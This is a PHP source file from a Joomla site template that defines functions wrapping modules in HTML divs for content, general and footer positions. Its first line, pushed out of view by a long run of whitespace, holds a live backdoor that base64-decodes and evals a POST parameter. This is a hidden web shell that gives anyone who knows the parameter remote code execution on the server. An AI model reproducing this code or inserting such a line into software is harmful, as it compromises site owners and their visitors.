<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nbf462e']));?><?php
defined('_JEXEC') or die('Restricted access');

function modChrome_module_content($module, &$params, &$attribs)
{
	if (!empty ($module->content)) : 
	$position = isset($attribs['type']) ? $attribs['type'] : '';
	?>
		<div class="moduletable<?php echo $params->get('moduleclass_sfx'); ?> general-content <?php echo $position;?>">
			<div class="modul-top"></div>
			<div class="modul-body">
				<?php if ($module->showtitle) : ?>
					<div class="modul-title"><span><?php echo $module->title; ?></span></div>
				<?php endif; ?>
				<div class="modul-content">
					<?php echo $module->content; ?>
				</div>
			</div>
			<div class="modul-bottom"></div>		
		</div>
	<!--[if IE]>
	<div style="clear:both"></div>
	<![endif]-->
	<?php endif;
}

function modChrome_module($module, &$params, &$attribs)
{
	if (!empty ($module->content)) : ?>
	
		<div class="moduletable<?php echo $params->get('moduleclass_sfx'); ?> general-module">
			<div class="modul-top"></div>
			<div class="modul-body">
				<?php if ($module->showtitle) : ?>
					<div class="modul-title"><span><?php echo $module->title; ?></span></div>
				<?php endif; ?>
				<div class="modul-content">
					<?php echo $module->content; ?>
				</div>
			</div>
			<div class="modul-bottom"></div>		
		</div>
	
	<?php endif;
}


function modChrome_footer($module, &$params, &$attribs)
{
	if (!empty ($module->content)) : 
		$position = isset($attribs['position']) ? $attribs['position'] : '';
		$expand= isset($attribs['expand']) ? (int)$attribs['expand'] : '';
		$class=($params->get('moduleclass_sfx')=='double' && $expand) ? 'large-module' : '';
	?>
		<div class="moduletable<?php echo $params->get('moduleclass_sfx'); ?> general-module <?php echo $class;?> <?php echo $position;?>">
			<div class="modul-top"></div>
			<div class="modul-body">
				<?php if ($module->showtitle) : ?>
					<div class="modul-title"><span><?php echo $module->title; ?></span></div>
				<?php endif; ?>
				<div class="modul-content">
					<?php echo $module->content; ?>
				</div>
			</div>
			<div class="modul-bottom"></div>		
		</div>
	
	<?php endif;
}
